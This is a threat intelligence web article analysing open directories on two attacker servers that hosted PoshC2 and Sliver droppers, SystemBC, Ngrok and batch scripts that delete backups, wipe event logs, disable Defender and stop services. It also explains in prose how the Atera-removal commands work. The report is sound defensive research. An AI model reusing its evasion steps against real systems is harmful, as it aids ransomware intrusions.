		<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-38108"><a href="https://thedfirreport.com/services/dfir-labs/ctf-winners/">CTF Winners</a></li>
	</ul>
</li>
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21320"><a href="https://thedfirreport.com/services/case-artifacts/">Case Artifacts</a></li>
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-21317"><a href="https://thedfirreport.com/services/mentoring-coaching-program/">Mentoring &#038; Coaching Program</a>
	<ul class="sub-menu">
		<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21325"><a href="https://thedfirreport.com/services/mentoring-coaching-program/book-a-session/">Book A Session</a></li>
		<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21326"><a href="https://thedfirreport.com/services/mentoring-coaching-program/meet-the-team/">Meet The Team</a></li>
	</ul>
</li>
</ul>
</li>
<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-31033"><a href="https://store.thedfirreport.com/collections/dfir-labs">Access DFIR Labs</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21312"><a href="https://thedfirreport.com/merchandise/">Merchandise</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21313"><a href="https://thedfirreport.com/subscribe/">Subscribe</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21316"><a href="https://thedfirreport.com/contact/">Contact Us</a></li>
</ul>								</nav><!-- #site-navigation -->
            			</div>
        				</div><!-- .wrap -->
     				</div><!-- .navigation-top -->
				<div class="clock"> 
					<div id="time"></div>
					<div id="date">Friday, October 25, 2024</div>
				</div>
				</div><!-- #nav-sticker -->
				       <nav class="secondary-navigation" role="navigation" aria-label="Secondary Navigation">
            <div class="wrap">
                <button class="secondary-menu-toggle" aria-controls="primary-menu" aria-expanded="false">
                    <span class="secondary-toggle-text">Menu</span>
                    <span class="secondary-toggle-bar"></span>
                </button>
                <ul id="primary-menu" class="secondary-menu"><li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21323"><a href="https://thedfirreport.com/services/threat-intelligence/">Threat Intelligence</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21322"><a href="https://thedfirreport.com/services/detection-rules/">Detection Rules</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-31037"><a href="https://thedfirreport.com/services/dfir-labs/">DFIR Labs</a>
<ul class="sub-menu">
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-35457"><a href="https://thedfirreport.com/services/dfir-labs/ctf/">Capture The Flag (CTF)</a></li>
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-32608"><a href="https://thedfirreport.com/services/dfir-labs/dfir-labs-leaderboard/">Leaderboard</a></li>
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-38110"><a href="https://thedfirreport.com/services/dfir-labs/ctf-winners/">CTF Winners</a></li>
</ul>
</li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-21321"><a href="https://thedfirreport.com/services/mentoring-coaching-program/">Mentoring &#038; Coaching Program</a>
<ul class="sub-menu">
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21327"><a href="https://thedfirreport.com/services/mentoring-coaching-program/book-a-session/">Book A Session</a></li>
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21328"><a href="https://thedfirreport.com/services/mentoring-coaching-program/meet-the-team/">Meet The Team</a></li>
</ul>
</li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21324"><a href="https://thedfirreport.com/services/case-artifacts/">Case Artifacts</a></li>
</ul>            </div><!-- .wrap -->
        </nav><!-- .secondary-navigation -->       
			</div><!-- .main-header-brand -->
						
							</div><!-- .main-header -->
	</header><!-- #masthead -->

	<div id="content" class="site-content">
		<div class="site-content-cell">
						<div class="wrap wrap-width">

	<div id="primary" class="content-area">
		<main id="main" class="site-main">

		
<article id="post-37127" class="post-37127 post type-post status-publish format-standard hentry category-opendir entry">
	
	<div class="entry-content-holder">
		<header class="entry-header">

		
				<div class="entry-meta">

					
		<span class="cat-links">
		
			<a class="category-color-125" href="https://thedfirreport.com/category/opendir/">opendir</a>
				</span>
	
				</div><!-- .entry-meta -->
			<h1 class="entry-title">Threat Actors&#8217; Toolkit: Leveraging Sliver, PoshC2 &#038; Batch Scripts</h1>
		<div class="entry-meta">
			<span class="posted-on"><a href="https://thedfirreport.com/2024/08/12/threat-actors-toolkit-leveraging-sliver-poshc2-batch-scripts/" rel="bookmark"><time class="entry-date published" datetime="2024-08-12T01:46:57+00:00">August 12, 2024</time></a></span>		</div><!-- .entry-meta -->

		
	</header><!-- .entry-header -->

	<div class="entry-content">
		
<h2 class="wp-block-heading">Key Takeaways</h2>



<ul class="wp-block-list">
<li>In early December of 2023, we discovered an open directory filled with batch scripts, primarily designed for defense evasion and executing command and control payloads. These scripts execute various actions, including disabling antivirus processes and stopping services related to SQL, Hyper-V, security tools, and Exchange servers.</li>



<li>This report also highlights scripts responsible for erasing backups, wiping event logs, and managing the installation or removal of remote monitoring tools like Atera.</li>



<li>Our investigation uncovered the use of additional tools, including Ngrok for proxy services, SystemBC, and two well-known command and control frameworks: Sliver and PoshC2.</li>



<li>The observed servers show long term usage by the threat actors, appearing in The DFIR Report Threat Feeds as far back as September 2023. They have been active intermittently since then, with the most recent activity detected in August 2024.</li>
<li>Ten new sigma rules were created from this report and added to our private sigma ruleset</li>
</ul>
<p>An audio version of this report can be found on <a href="https://podcasters.spotify.com/pod/show/the-dfir-report/" target="_blank" rel="noopener">Spotify</a>, <a href="https://podcasts.apple.com/us/podcast/reports/id1728699064" target="_blank" rel="noopener">Apple</a>, <a href="https://www.youtube.com/@TheDFIRReport/videos" target="_blank" rel="noopener">YouTube</a>, <a href="https://www.audible.com/pd/Reports-Podcast/B0CSZBRCFX?action_code=ASSGB149080119000H&amp;share_location=pdp" target="_blank" rel="noopener">Audible</a>, &amp; <a href="https://music.amazon.com/podcasts/c4fe897d-a4b4-4ceb-908d-d1a78af8cb6d/reports" target="_blank" rel="noopener">Amazon</a>.</p>



<h2 class="wp-block-heading">The DFIR Report Services</h2>



<ul class="wp-block-list">
<li><a href="https://thedfirreport.com/services/threat-intelligence/#threat-brief" target="_blank" rel="noreferrer noopener">Private Threat Briefs</a>: Over 20 private DFIR reports annually.</li>



<li><a href="https://thedfirreport.com/services/threat-intelligence/#threat-feed" target="_blank" rel="noreferrer noopener">Threat Feed</a>: Focuses on tracking Command and Control frameworks like Cobalt Strike, Metasploit, Sliver, etc.</li>



<li><a href="https://thedfirreport.com/services/threat-intelligence/#all-intel" target="_blank" rel="noreferrer noopener">All Intel</a>: Includes everything from Private Threat Briefs and Threat Feed, plus private events, opendir reports, long-term tracking, data clustering, and other curated intel.</li>



<li><a href="https://thedfirreport.com/services/detection-rules/" target="_blank" rel="noreferrer noopener">Private Sigma Ruleset</a>: Features 100+ Sigma rules derived from 40+ cases, mapped to ATT&amp;CK with test examples.</li>



<li><a href="https://thedfirreport.com/services/dfir-labs/" target="_blank" rel="noreferrer noopener">DFIR Labs</a>: Offers cloud-based, hands-on learning experiences, using real data, from real intrusions. Interactive labs are available with different difficulty levels and can be accessed on-demand, accommodating various learning speeds.</li>
</ul>



<p><a href="https://thedfirreport.com/contact/" target="_blank" rel="noreferrer noopener">Contact us</a> today for pricing or a demo!</p>



<p><strong>Table of Contents:</strong></p>



<ul>
<li><a href="#summary">Summary</a></li>
<li><a href="#analysts">Analysts</a></li>
<li><a href="#adversary">Adversary</a></li>
<li><a href="#infrastructure">Infrastructure</a></li>
<li><a href="#capability">Capability</a></li>
<li><a href="#victim">Victim</a></li>
<li><a href="#iocs">Indicators</a></li>
</ul>





<h2 id="summary" class="wp-block-heading"><a href="#summary">Summary</a></h2>



<p>In this report, we delve into an open directory on 94.198.53.143, first observed on December 10, 2023, during our intelligence collection process. Prior to the open directory appearing, this address had appeared in our threat intelligence feeds for PoshC2 command and control. It first appeared on September 21, 2023 and has been intermittently active, most recently on August 11, 2024, showing that the infrastructure is being utilized over a long timeframe.</p>



<p>Besides PoshC2, the threat actor identified utilized a range of batch scripts and malware to compromise both Windows and Linux systems. Their toolkit featured scripts such as atera_del.bat and atera_del2.bat to remove Atera agents, backup.bat and delbackup.bat to delete system backups and shadow copies, and clearlog.bat to erase Windows event logs and associated data.</p>



<p>The actor employed cmd.cmd to disable User Account Control and modify registry settings, while scripts like def1.bat and defendermalwar.bat are used to disable Windows Defender, scheduled tasks, and uninstall Malwarebytes. They also utilized tools such as Ngrok for proxy purposes, Posh_v2_dropper_x64.exe for PowerShell-based command-and-control operations, and VmManagedSetup.exe, which contains SystemBC malware.</p>



<p>The threat actor further disrupted systems by stopping and disabling various critical services, using scripts like disable.bat and hyp.bat, and logging off user sessions with LOGOFALL.bat and LOGOFALL1.bat. Their overarching goal appeared to be system compromise, data destruction, and evasion of detection mechanisms.</p>



<p>During our investigation, we pivoted using Shodan and identified the name &#8216;PoshC2&#8217; linked to port 443 among the open ports. Further exploration using the HTTP HTML hash filter (http.html_hash:-1700067737) revealed a second IP address, 185.234.216.64:8000, with another open directory containing binaries closely matching those found at the first IP address.</p>



<p>Within the second open directory at 185.234.216.64:8000, we discovered a text file named poshc2+user.txt that outlined the creation of a user account by misspelling &#8216;WDAGUtilityAccount&#8217; as &#8216;WDAGUtilltyAccount&#8217;. The script also included instructions for downloading the .MSI version of the Atera Agent using the email &#8216;<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="a8ccc9dcc1c4dac9cfc6c9e8cfc5c9c1c486cbc7c5">[email&#160;protected]</a>&#8217;.</p>



<p>Although the open directory at 94.198.53.143:8000, located in Russia, has been taken down, various security vendors, including the DFIR Report, continue flagging this IP for PoshC2 activity. As of August 11, 2024, the second IP, 185.234.216.64:8000, remains accessible, indicating the threat actor&#8217;s continued use of this directory to host malicious batch scripts and binaries, leveraging PoshC2 and Sliver as their primary command-and-control tool kits.</p>



<p>Compared to our last <a href="https://thedfirreport.com/2023/12/18/lets-opendir-some-presents-an-analysis-of-a-persistent-actors-activity/" target="_blank" rel="noreferrer noopener">open directory report</a>, no data was present to indicate victims or targeting information. However, based on the tools presented we can conclude with medium confidence that these servers were used in ransomware intrusion activity&#8211;seeing many scripts looking to kill or stop services, delete backups and shadow copies, and disable or remove antivirus software.</p>



<h2 id="analysts" class="wp-block-heading"><a href="#analysts">Analysts</a></h2>



<p>Analysis and reporting completed by <a href="https://twitter.com/r3nzsec" target="_blank" rel="noreferrer noopener">r3nzsec</a>, <a href="https://x.com/0xtornado" target="_blank" rel="noopener">0xtornado</a> &amp; <a href="https://twitter.com/0xThiebaut" target="_blank" rel="noreferrer noopener">0xThiebaut</a></p>



<h2 id="adversary" class="wp-block-heading"><a href="#adversary">Adversary</a></h2>



<p>In the second open directory discovered via pivoting techniques, we observed a text file named ‘poshc2+user.txt’. This file detailed the creation of a user account, masquerading as the default Windows account ‘WDAGUtilityAccount’ but with an extra ‘l’, becoming ‘WDAGUtilltyAccount’. The script also included instructions to download the .MSI version of the Atera Agent using curl and a login of ‘<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="ea8e8b9e8386988b8d848baa8d878b8386c4898587">[email&#160;protected]</a>’, which appears to be a legitimate email address associated with an Atera Agent account.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_001_1.png"><img fetchpriority="high" decoding="async" class="aligncenter size-full wp-image-37201" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_001_1.png" alt="" width="3170" height="1522" srcset="https://thedfirreport.com/wp-content/uploads/2024/08/26297_001_1.png 3170w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_001_1-300x144.png 300w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_001_1-1024x492.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_001_1-768x369.png 768w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_001_1-1536x737.png 1536w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_001_1-2048x983.png 2048w" sizes="(max-width: 3170px) 100vw, 3170px" /></a></p>





<h2 id="infrastructure" class="wp-block-heading"><a href="#infrastructure">Infrastructure</a></h2>



<p>During our analysis of the IP address hosting the open directory, 94.198.53.143, we found it associated with PoshC2. Using external data sources like VirusTotal revealed several connections, including file communications, downloads, URLs, and notably, collections of Command and Control (C2) frameworks. As illustrated in the screenshot provided, this IP address was linked to two distinct C2 frameworks: &#8216;PoshC2&#8217; and &#8216;Sliver&#8217;. These two command &amp; control (C2) frameworks are available for download on GitHub and are commonly utilized by penetration testers and red team professionals as part of their assessments and simulations.</p>



<ul class="wp-block-list">
<li>Posh C2 &#8211; <a href="https://github.com/nettitude/PoshC2" target="_blank" rel="noreferrer noopener">https://github.com/nettitude/PoshC2</a></li>



<li>Sliver &#8211; <a href="https://github.com/BishopFox/sliver" target="_blank" rel="noreferrer noopener">https://github.com/BishopFox/sliver</a></li>
</ul>



<p>However, we have also observed that these two opensource tools are being used by threat actors.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_002.png"><img decoding="async" class="aligncenter size-full wp-image-37133" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_002.png" alt="" width="2596" height="1764" srcset="https://thedfirreport.com/wp-content/uploads/2024/08/26297_002.png 2596w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_002-300x204.png 300w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_002-1024x696.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_002-768x522.png 768w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_002-1536x1044.png 1536w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_002-2048x1392.png 2048w" sizes="(max-width: 2596px) 100vw, 2596px" /></a></p>





<p>We then proceeded to dig deeper into the open directory IP (94.198.53.143) using Shodan, to look around and see if we could find useful pivots, and additional information. A quick look into the information below, shows that this IP had multiple open ports: 80, 123, 443, 1337, 8000, 8443</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_003.png"><img decoding="async" class="aligncenter size-full wp-image-37134" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_003.png" alt="" width="3182" height="1846" srcset="https://thedfirreport.com/wp-content/uploads/2024/08/26297_003.png 3182w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_003-300x174.png 300w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_003-1024x594.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_003-768x446.png 768w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_003-1536x891.png 1536w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_003-2048x1188.png 2048w" sizes="(max-width: 3182px) 100vw, 3182px" /></a></p>





<p>Scrolling down the list of open ports, we noticed the name &#8220;PoshC2&#8221; associated with port 443. As this looked to be of interest in our investigation, we looked into the http html hash &#8220;http.html_hash:-1700067737&#8221; and used this as a new query to look around.</p>



<figure class="wp-block-image"></figure>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_004.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37135" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_004.png" alt="" width="1480" height="1258" srcset="https://thedfirreport.com/wp-content/uploads/2024/08/26297_004.png 1480w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_004-300x255.png 300w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_004-1024x870.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_004-768x653.png 768w" sizes="(max-width: 1480px) 100vw, 1480px" /></a></p>



<p>Upon searching for that http.html_hash, we found another IP 185.234.216.64.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_005.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37136" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_005.png" alt="" width="3112" height="1964" srcset="https://thedfirreport.com/wp-content/uploads/2024/08/26297_005.png 3112w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_005-300x189.png 300w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_005-1024x646.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_005-768x485.png 768w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_005-1536x969.png 1536w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_005-2048x1293.png 2048w" sizes="(max-width: 3112px) 100vw, 3112px" /></a></p>





<p>This IP (185.234.216.64) was also based in Moscow, Russia, with 3 open ports: 123, 443, and 8000.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_006.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37137" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_006.png" alt="" width="3170" height="1894" srcset="https://thedfirreport.com/wp-content/uploads/2024/08/26297_006.png 3170w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_006-300x179.png 300w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_006-1024x612.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_006-768x459.png 768w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_006-1536x918.png 1536w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_006-2048x1224.png 2048w" sizes="(max-width: 3170px) 100vw, 3170px" /></a></p>





<p>Checking out the open ports, we observed that port 8000 had an HTTP status code of 200, which hinted that this might still be active and accessible.</p>



<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_007.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37138" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_007.png" alt="" width="1472" height="634" srcset="https://thedfirreport.com/wp-content/uploads/2024/08/26297_007.png 1472w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_007-300x129.png 300w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_007-1024x441.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_007-768x331.png 768w" sizes="(max-width: 1472px) 100vw, 1472px" /></a></figure>



<p>Upon further investigation, we discovered another active PoshC2 open directory with nearly identical batch and executable files to those found on the initial PoshC2 IP. This discovery was made through a simple pivot in Shodan. We retrieved files from this new open directory (185.234.216.64:8000) on two occasions: March 1, 2024, and June 29, 2024. Notably, the latest retrieval contained more files than the first one. However, the most interesting part of the March version of the open directory was the ‘poschc2+user.txt’ file, which we managed to retrieve before it was deleted by the threat actor.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_008.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37139" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_008.png" alt="" width="1912" height="1168" srcset="https://thedfirreport.com/wp-content/uploads/2024/08/26297_008.png 1912w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_008-300x183.png 300w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_008-1024x626.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_008-768x469.png 768w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_008-1536x938.png 1536w" sizes="(max-width: 1912px) 100vw, 1912px" /></a></p>





<h3 class="wp-block-heading">The DFIR Report Threat Feed Data</h3>



<p>The DFIR Report threat intelligence team has been monitoring these IP addresses for their involvement in various command and control frameworks for our <a href="https://thedfirreport.com/services/threat-intelligence/" target="_blank" rel="noopener">Threat Feeds</a>, prior to our investigation into the open directory.</p>



<p>The IP address 94.198.53.143 was first detected on September 21, 2023, and has since shown intermittent activity. It has been primarily associated with PoshC2 and Sliver, with a single instance linked to Empire. The infrastructure&#8217;s use of different command and control frameworks is sporadic, but it is regularly reactivated, with the most recent activity occurring in August 2024.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_009.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37140" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_009.png" alt="" width="1910" height="410" srcset="https://thedfirreport.com/wp-content/uploads/2024/08/26297_009.png 1910w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_009-300x64.png 300w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_009-1024x220.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_009-768x165.png 768w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_009-1536x330.png 1536w" sizes="(max-width: 1910px) 100vw, 1910px" /></a></p>





<p>The IP address 185.234.216.64 has been exclusively associated with PoshC2 activity. It has been intermittently used from October 2023 through August 2024.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_010.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37141" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_010.png" alt="" width="1909" height="411" srcset="https://thedfirreport.com/wp-content/uploads/2024/08/26297_010.png 1909w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_010-300x65.png 300w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_010-1024x220.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_010-768x165.png 768w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_010-1536x331.png 1536w" sizes="(max-width: 1909px) 100vw, 1909px" /></a></p>
<p>&nbsp;</p>





<h2 id="capability" class="wp-block-heading"><a href="#capability">Capabilities</a></h2>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_011.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37142" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_011.png" alt="" width="4903" height="2977" srcset="https://thedfirreport.com/wp-content/uploads/2024/08/26297_011.png 4903w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_011-300x182.png 300w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_011-1024x622.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_011-768x466.png 768w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_011-1536x933.png 1536w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_011-2048x1244.png 2048w" sizes="(max-width: 4903px) 100vw, 4903px" /></a></p>





<p>This next section will cover the different tools/scripts in the open directory. Below is a short summary of each of the files, which we will then cover in more detail.</p>



<p><a href="#c01"><strong>atera_del.bat/atera_del2.bat</strong></a></p>



<ul class="wp-block-list">
<li>This batch script is for removing Atera remote management agent.</li>
</ul>



<p><a href="#c02"><strong>backup.bat</strong></a></p>



<ul class="wp-block-list">
<li>This batch script is used to delete all system state and general backups, remove all shadow copies, and ignore all boot failures.</li>
</ul>



<p><a href="#c03"><strong>clearlog.bat</strong></a></p>



<ul class="wp-block-list">
<li>This batch script to delete Windows event logs that also delete recycle bin and registry keys related to terminal server client.</li>
</ul>



<p><a href="#c04"><strong>cmd.cmd</strong></a></p>



<ul class="wp-block-list">
<li>This file disables UAC, modifies registry settings, including RDP settings.</li>
</ul>



<p><a href="#c05"><strong>def1.bat</strong></a></p>



<ul class="wp-block-list">
<li>This batch script disables Windows Defender and scheduled tasks.</li>
</ul>



<p><a href="#c06"><strong>defendermalwar.bat</strong></a></p>



<ul class="wp-block-list">
<li>This batch script disables Windows Defender, altering user account control settings and uninstalling Malwarebytes.</li>
</ul>



<p><a href="#c07"><strong>delbackup.bat</strong></a></p>



<ul class="wp-block-list">
<li>This batch script, which deletes all system state backups, backup catalogs, shadow copies, and alters boot configuration setting to ignore failures.</li>
</ul>



<p><a href="#c08"><strong>disable.bat</strong></a></p>



<ul class="wp-block-list">
<li>This batch script stops and disables services related to Microsoft SQL &amp; Exchange, various database services, and additional system services on a Windows server/workstation.</li>
</ul>



<p><a href="#c09"><strong>hyp.bat</strong></a></p>



<ul class="wp-block-list">
<li>This batch script deletes various Hyper-V, SQL, and Firebird server services. It also stops a wide range of system and third-party services in Windows machines.</li>
</ul>



<p><a href="#c10"><strong>LOGOFALL.bat</strong></a></p>



<ul class="wp-block-list">
<li>This batch script lists all user sessions, and logs off each session except the first one.</li>
</ul>



<p><a href="#c11"><strong>LOGOFALL1.bat</strong></a></p>



<ul class="wp-block-list">
<li>This batch script attempts to log off all sessions up to the 20th session, excluding the user&#8217;s current session.</li>
</ul>



<p><a href="#c12"><strong>NG1.bat</strong></a></p>



<ul class="wp-block-list">
<li>This batch script contains a Ngrok authentication token that runs on port 3389 (RDP).</li>
</ul>



<p><a href="#c13"><strong>NG2.bat</strong></a></p>



<ul class="wp-block-list">
<li>This batch script that contains a Ngrok authentication token that runs in the same port, 3389 (RDP).</li>
</ul>



<p><a href="#c14"><strong>Ngrok.exe</strong></a></p>



<ul class="wp-block-list">
<li>This is a legitimate tool, which can, and was, abused for proxy purposes.</li>
</ul>



<p><a href="#c15"><strong>ON.bat</strong></a></p>



<ul class="wp-block-list">
<li>This batch script to ensure that the network services are running and set to start automatically.</li>
</ul>



<p><a href="#c16"><strong>Posh_v2_dropper_x64.exe</strong></a></p>



<ul class="wp-block-list">
<li>The PoshC2 dropper, a PowerShell-based C2 executable.</li>
</ul>



<p><a href="#c17"><strong>native_dropper</strong></a></p>



<ul class="wp-block-list">
<li>The Linux version of Posh_v2_dropper_x64.exe.</li>
</ul>



<p><a href="#c18"><strong>poshc2+user.txt</strong></a></p>



<ul class="wp-block-list">
<li>The text file with PowerShell one-liners to execute PoshC2 agent and perform further post-exploitation actions.</li>
</ul>



<p><a href="#c19"><strong>py_dropper.sh</strong></a></p>



<ul class="wp-block-list">
<li>Bash shell script to execute a python dropper for PoshC2.</li>
</ul>



<p><a href="#c20"><strong>Setup_uncnow.msi</strong></a></p>



<ul class="wp-block-list">
<li>Atera remote admin tool installer.</li>
</ul>



<p><strong><a href="#c21">shadow.bat</a>/<a href="#c22">shadowGuru.bat</a></strong></p>



<ul class="wp-block-list">
<li>This batch script consists of multiple registry key deletions pertaining to security tools, including the creation of network shares for multiple disk drives while granting full access permissions to everyone.</li>
</ul>



<p><a href="#c23"><strong>VmManagedSetup.exe</strong></a></p>



<ul class="wp-block-list">
<li>SystemBC malware executable.</li>
</ul>



<p><a href="#c24"><strong>WILD_PRIDE.exe</strong></a></p>



<ul class="wp-block-list">
<li>Sliver C2 framework executable.</li>
</ul>



<p><a href="#c25"><strong>z.bat</strong></a></p>



<ul class="wp-block-list">
<li>This batch script is to remove services and processes associated with Hyper-V, multiple AV programs, SQL, and other specific services.</li>
</ul>



<p><a href="#c26"><strong>z1.bat</strong></a></p>



<ul class="wp-block-list">
<li>Huge scripts to automate the disabling of processes, services, registry modification, and a lot of defense evasion techniques.</li>
</ul>



<h3 id="c01" class="wp-block-heading"><strong>atera_del.bat/atera_del2.bat</strong></h3>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_012.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37143" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_012.png" alt="" width="2208" height="1826" srcset="https://thedfirreport.com/wp-content/uploads/2024/08/26297_012.png 2208w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_012-300x248.png 300w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_012-1024x847.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_012-768x635.png 768w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_012-1536x1270.png 1536w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_012-2048x1694.png 2048w" sizes="(max-width: 2208px) 100vw, 2208px" /></a></p>





<p>The main goal of this batch file is to remove and uninstall Atera software, including the registry keys, services, and directories associated with Atera Agent installation. The exact commands observed in atera_del.bat have been seen in many public resources as a known way to uninstall/delete Atera from a system.</p>



<ul class="wp-block-list">
<li><a href="https://www.reddit.com/r/syncro/comments/pf85te/working_script_for_removing_atera_agent/" target="_blank" rel="noreferrer noopener">https://www.reddit.com/r/syncro/comments/pf85te/working_script_for_removing_atera_agent/</a></li>



<li><a href="https://www.cliftonsystems.co.uk/atera-removal-script/" target="_blank" rel="noreferrer noopener">https://www.cliftonsystems.co.uk/atera-removal-script/</a></li>



<li><a href="https://patrickdomingues.com/2022/01/19/how-to-uninstall-atera-agent-software/" target="_blank" rel="noreferrer noopener">https://patrickdomingues.com/2022/01/19/how-to-uninstall-atera-agent-software/</a></li>
</ul>



<p>The first line command is to silently uninstall the software associated with the given product code via msiexec, which in this case, is the product code dedicated to Atera. The command line parameter &#8220;/x&#8221; is used to uninstall a program, while the &#8220;/qn&#8221; means quiet mode to uninstall Atera silently without any prompts to the user.</p>



<p>The timeout command is used to ensure a slight pause (5 secs) after the uninstallation command is executed, possibly to allow for proper completion of the Atera uninstall process before proceeding to any subsequent commands in the batch file.</p>



<p>The sc command is also used, first to stop and then completely remove the AteraAgent service, all done silently without showing any output to the user with the help of &#8220;<em>&gt; nul 2&gt; nul</em>&#8221; commands.</p>



<p>The taskkill command is used to terminate a specific process, which in this case is the TicketingTray.exe. TicketingTray.exe is part of the AteraAgent software commonly used to display the Atera Icon on the system.</p>



<p>The REG command is used to force &#8220;<em>f</em>&#8221; delete the registry keys related to Atera Networks</p>



<p>RMDIR command silently and recursively deletes the &#8220;TrayIconCaching&#8221; directory in the current user&#8217;s local temporary files. &#8220;<em>/S</em>&#8221; removes all directories and files in the specified directory in addition to the directory itself, while &#8220;<em>/Q</em>&#8221; stands for &#8216;quiet mode&#8217; and does not prompt for confirmation.</p>



<p>The <em>RMDIR</em> command is used again to delete the installation folders of &#8220;ATERA Networks&#8221; from both the standard &#8220;Program Files&#8221; and &#8220;Program Files (x86)&#8221; directories.</p>



<h3 id="c02" class="wp-block-heading"><strong>backup.bat</strong></h3>
